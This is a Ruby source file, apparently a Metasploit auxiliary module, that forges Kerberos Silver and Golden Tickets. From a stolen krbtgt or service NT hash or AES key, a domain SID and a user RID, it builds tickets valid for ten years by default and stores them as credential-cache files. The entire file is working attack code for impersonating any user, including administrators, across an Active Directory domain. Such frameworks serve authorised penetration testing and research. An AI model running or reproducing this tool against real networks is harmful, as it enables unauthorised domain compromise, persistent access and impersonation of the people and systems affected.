##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::Kerberos::Client
  include Msf::Exploit::Remote::Kerberos::Ticket

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Kerberos Silver/Golden Ticket Forging',
        'Description' => %q{
          This module forges a Kerberos ticket
        },
        'Author' => [
          'Benjamin Delpy', # Original Implementation
          'Dean Welch' # Metasploit Module
        ],
        'References' => [
          %w[URL https://www.slideshare.net/gentilkiwi/abusing-microsoft-kerberos-sorry-you-guys-dont-get-it]
        ],
        'License' => MSF_LICENSE,
        'Notes' => {
          'Stability' => [],
          'SideEffects' => [],
          'Reliability' => [],
          'AKA' => ['Silver Ticket', 'Golden Ticket', 'Ticketer']
        },
        'Actions' => [
          ['FORGE_SILVER', { 'Description' => 'Forge a Silver Ticket' } ],
          ['FORGE_GOLDEN', { 'Description' => 'Forge a Golden Ticket' } ],
        ],
        'DefaultAction' => 'FORGE_SILVER'
      )
    )

    register_options(
      [
        OptString.new('USER', [ true, 'The Domain User' ]),
        OptInt.new('USER_RID', [ true, "The Domain User's relative identifier(RID)", Rex::Proto::Kerberos::Pac::DEFAULT_ADMIN_RID]),
        OptString.new('NTHASH', [ false, 'The krbtgt/service nthash' ]),
        OptString.new('AES_KEY', [ false, 'The krbtgt/service AES key' ]),
        OptString.new('DOMAIN', [ true, 'The Domain (upper case) Ex: DEMO.LOCAL' ]),
        OptString.new('DOMAIN_SID', [ true, 'The Domain SID, Ex: S-1-5-21-1755879683-3641577184-3486455962']),
        OptString.new('SPN', [ false, 'The Service Principal Name (Only used for silver ticket)'], regex: %r{.*/.*}),
        OptInt.new('DURATION', [ false, 'Duration of the ticket in days', 3650]),
        OptString.new('FILENAME', [ false, 'The file name', nil]),
      ]
    )
    deregister_options('RHOSTS', 'RPORT', 'Timeout')
  end

  SECS_IN_DAY = 60 * 60 * 24

  def run
    validate_options

    if datastore['NTHASH']
      enc_type = Rex::Proto::Kerberos::Crypto::Encryption::RC4_HMAC
      key = datastore['NTHASH']
    else
      key = datastore['AES_KEY']
      if datastore['AES_KEY'].size == 64
        enc_type = Rex::Proto::Kerberos::Crypto::Encryption::AES256
      else
        enc_type = Rex::Proto::Kerberos::Crypto::Encryption::AES128
      end
    end

    enc_key = [key].pack('H*')
    start_time = Time.now
    end_time = start_time + SECS_IN_DAY * datastore['DURATION']

    ticket_type = nil

    case action.name
    when 'FORGE_SILVER'
      fail_with(Msf::Exploit::Failure::BadConfig, 'SPN must be set for forging a silver ticket') if datastore['SPN'].blank?
      sname = datastore['SPN'].split('/', 2)
      flags = Rex::Proto::Kerberos::Model::TicketFlags.from_flags(silver_ticket_flags)
      ticket_type = :tgs
    when 'FORGE_GOLDEN'
      sname = ['krbtgt', datastore['DOMAIN'].upcase]
      flags = Rex::Proto::Kerberos::Model::TicketFlags.from_flags(golden_ticket_flags)
      ticket_type = :tgt
    else
      fail_with(Msf::Module::Failure::BadConfig, "Invalid action #{action.name}")
    end
    ccache = forge_ticket(
      enc_key: enc_key,
      enc_type: enc_type,
      start_time: start_time,
      end_time: end_time,
      sname: sname,
      flags: flags,
      domain: datastore['DOMAIN'],
      username: datastore['USER'],
      user_id: datastore['USER_RID'],
      domain_sid: datastore['DOMAIN_SID']
    )

    fname = datastore['FILENAME']
    fname ||= "#{[datastore['USER'], (datastore['SPN'] || datastore['DOMAIN']).gsub(/[^\w]/, '_')].join('_')}.ccache"
    path = store_local('mit.kerberos.ccache', 'application/octet-stream', ccache.encode, fname)

    credential_krb_tgs_data = {
      workspace_id: myworkspace_id,
      realm_key: Metasploit::Model::Realm::Key::ACTIVE_DIRECTORY_DOMAIN,
      realm_value: datastore['DOMAIN'],
      module_fullname: framework_module.fullname,
      origin_type: :import,
      filename: fname,
      username: datastore['USER'],
      private_type: :krb_ticket,
      private_data: create_krb_ticket_data(
        type: ticket_type,
        ccache: ccache,
        sname: datastore['SPN']
      )
    }

    framework_module.create_credential(credential_krb_tgs_data)
    print_good("MIT Credential Cache ticket saved on #{path}")
  end

  private

  def validate_options
    if datastore['NTHASH'].blank? && datastore['AES_KEY'].blank?
      fail_with(Msf::Exploit::Failure::BadConfig, 'NTHASH or AES_KEY must be set for forging a ticket')
    elsif datastore['NTHASH'].present? && datastore['AES_KEY'].present?
      fail_with(Msf::Exploit::Failure::BadConfig, 'NTHASH and AES_KEY may not both be set for forging a ticket')
    end

    if datastore['NTHASH'].present? && datastore['NTHASH'].size != 32
      fail_with(Msf::Exploit::Failure::BadConfig, "NTHASH length was #{datastore['NTHASH'].size} should be 32")
    end

    if datastore['AES_KEY'].present? && (datastore['AES_KEY'].size != 32 && datastore['AES_KEY'].size != 64)
      fail_with(Msf::Exploit::Failure::BadConfig, "AES key length was #{datastore['AES_KEY'].size} should be 32 or 64")
    end
  end

  # @option [Symbol] :type Either tgt or tgs
  # @option [Rex::Proto::Kerberos::Model::PrincipalName,String] :sname The target service principal name.
  # @param [Rex::Proto::Kerberos::CredentialCache::Krb5Ccache] ccache
  # @return [Hash]
  def create_krb_ticket_data(type:, ccache:, sname: nil)
    # at this time Metasploit stores 1 credential per ccache file, so no need to iterate through them
    cred = ccache.credentials.first

    {
      type: type,
      sname: sname.to_s,
      value: ccache.encode,
      authtime: cred.authtime.to_time,
      starttime: cred.starttime.to_time,
      endtime: cred.endtime.to_time
    }
  end
end
